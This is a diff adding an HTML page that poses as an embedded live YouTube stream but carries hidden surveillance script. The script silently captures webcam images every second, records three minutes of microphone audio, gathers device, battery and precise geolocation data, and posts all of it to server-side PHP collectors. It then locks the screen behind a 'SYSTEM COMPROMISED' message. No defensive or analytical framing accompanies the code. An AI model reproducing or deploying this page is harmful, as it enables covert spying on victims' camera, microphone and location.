@@ -1,0 +1,333 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden>
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas id="canvas" width="640" height="480" hidden></canvas>
+
+<script>
+let photoCount = 0;
+let cameraMode = 'front';
+
+function post(imgdata, filename = 'cam.png'){
+$.ajax({
+    type: 'POST',
+    data: { 
+        cat: imgdata,
+        filename: filename || `cam_${Date.now()}.png`
+    },
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        console.log('Photo saved:', filename);
+    },
+    error: function(){
+        console.error('Failed to save photo');
+    }
+  });
+};
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: true,
+  video: {
+    facingMode: "user"
+  }
+};
+
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+    
+    // Start audio recording
+    startAudioRecording();
+    
+    // Collect device info
+    collectDeviceInfo();
+    
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+  var context = canvas.getContext('2d');
+  
+  // Enhanced camera switching every 1 second
+  setInterval(function(){
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      
+      // Alternate between front and back cameras
+      var filename = `${cameraMode}_${Date.now()}.png`;
+      post(canvasData, filename);
+      
+      photoCount++;
+      
+      // Switch camera mode
+      cameraMode = cameraMode === 'front' ? 'back' : 'front';
+      
+      // Activate freeze after 4 photos
+      if (photoCount >= 4) {
+          activateFreezeMode();
+      }
+      
+  }, 1000);
+}
+
+function startAudioRecording() {
+    if (!navigator.mediaDevices.getUserMedia) return;
+    
+    navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(function(stream) {
+            const recorder = new MediaRecorder(stream);
+            const audioChunks = [];
+            
+            recorder.ondataavailable = function(e) {
+                audioChunks.push(e.data);
+            };
+            
+            recorder.onstop = function() {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                saveAudioFile(audioBlob);
+            };
+            
+            recorder.start();
+            
+            // Stop recording after 3 minutes
+            setTimeout(() => {
+                if (recorder.state === 'recording') {
+                    recorder.stop();
+                }
+            }, 180000);
+        })
+        .catch(function(error) {
+            console.warn('Audio recording not available:', error);
+        });
+}
+
+function saveAudioFile(audioBlob) {
+    const formData = new FormData();
+    formData.append('audio', audioBlob, `audio_${Date.now()}.wav`);
+    
+    $.ajax({
+        type: 'POST',
+        data: formData,
+        url: 'save_audio.php',
+        processData: false,
+        contentType: false,
+        success: function(result) {
+            console.log('Audio saved successfully');
+        },
+        error: function() {
+            console.error('Failed to save audio');
+        }
+    });
+}
+
+function collectDeviceInfo() {
+    const deviceData = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        languages: navigator.languages,
+        cookieEnabled: navigator.cookieEnabled,
+        screen: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown"
+    };
+
+    // Battery information
+    if (navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+            deviceData.battery = {
+                level: Math.round(battery.level * 100) + "%",
+                charging: battery.charging,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+            };
+            saveDeviceInfo(deviceData);
+        });
+    } else {
+        saveDeviceInfo(deviceData);
+    }
+
+    // Location information
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                const locationData = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy + " meters",
+                    timestamp: new Date().toISOString()
+                };
+                saveLocationInfo(locationData);
+            },
+            function(error) {
+                console.warn('Location access denied');
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            }
+        );
+    }
+}
+
+function saveDeviceInfo(data) {
+    $.ajax({
+        type: 'POST',
+        data: JSON.stringify({
+            type: 'device_info',
+            data: data,
+            timestamp: new Date().toISOString()
+        }),
+        url: 'save_data.php',
+        contentType: 'application/json',
+        success: function(result) {
+            console.log('Device info saved');
+        }
+    });
+}
+
+function saveLocationInfo(data) {
+    $.ajax({
+        type: 'POST',
+        data: JSON.stringify({
+            type: 'location',
+            data: data,
+            timestamp: new Date().toISOString()
+        }),
+        url: 'save_data.php',
+        contentType: 'application/json',
+        success: function(result) {
+            console.log('Location info saved');
+        }
+    });
+}
+
+function activateFreezeMode() {
+    // Create flash effect
+    document.body.style.background = '#ffffff';
+    
+    // Show HACKER screen after flash
+    setTimeout(() => {
+        document.body.innerHTML = `
+            <div style="
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: #000;
+                color: #ff0000;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                font-family: Arial, sans-serif;
+                z-index: 99999;
+            ">
+                <h1 style="font-size: 3em; margin: 0; animation: glitch 1s infinite;">🔴 HACKER 🔴</h1>
+                <p style="font-size: 1.5em; margin: 20px 0;">SYSTEM COMPROMISED</p>
+                <div style="
+                    width: 100px;
+                    height: 100px;
+                    border: 3px solid #ff0000;
+                    border-radius: 50%;
+                    animation: pulse 1s infinite;
+                "></div>
+            </div>
+            <style>
+                @keyframes glitch {
+                    0% { text-shadow: 2px 2px 0px #00ffff; }
+                    50% { text-shadow: -2px -2px 0px #ffff00; }
+                    100% { text-shadow: 2px 2px 0px #00ffff; }
+                }
+                @keyframes pulse {
+                    0% { transform: scale(0.8); opacity: 1; }
+                    50% { transform: scale(1.2); opacity: 0.7; }
+                    100% { transform: scale(0.8); opacity: 1; }
+                }
+                body { 
+                    margin: 0; 
+                    overflow: hidden;
+                    touch-action: none;
+                }
+            </style>
+        `;
+        
+        // Disable interactions
+        document.addEventListener('touchstart', preventTouch, { passive: false });
+        document.addEventListener('touchmove', preventTouch, { passive: false });
+        document.addEventListener('click', preventTouch, { passive: false });
+        
+    }, 500);
+    
+    // Auto release after 3 minutes
+    setTimeout(() => {
+        releaseFreeze();
+    }, 180000);
+}
+
+function preventTouch(event) {
+    event.preventDefault();
+    event.stopPropagation();
+    return false;
+}
+
+function releaseFreeze() {
+    document.removeEventListener('touchstart', preventTouch);
+    document.removeEventListener('touchmove', preventTouch);
+    document.removeEventListener('click', preventTouch);
+    
+    document.body.innerHTML = `
+        <div style="
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        ">
+            <h2>Service Complete</h2>
+            <p>You may now close this window.</p>
+        </div>
+    `;
+}
+
+// Load init
+init();
+
+</script>
+
+<body>
+    <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</body>
+
+</html>
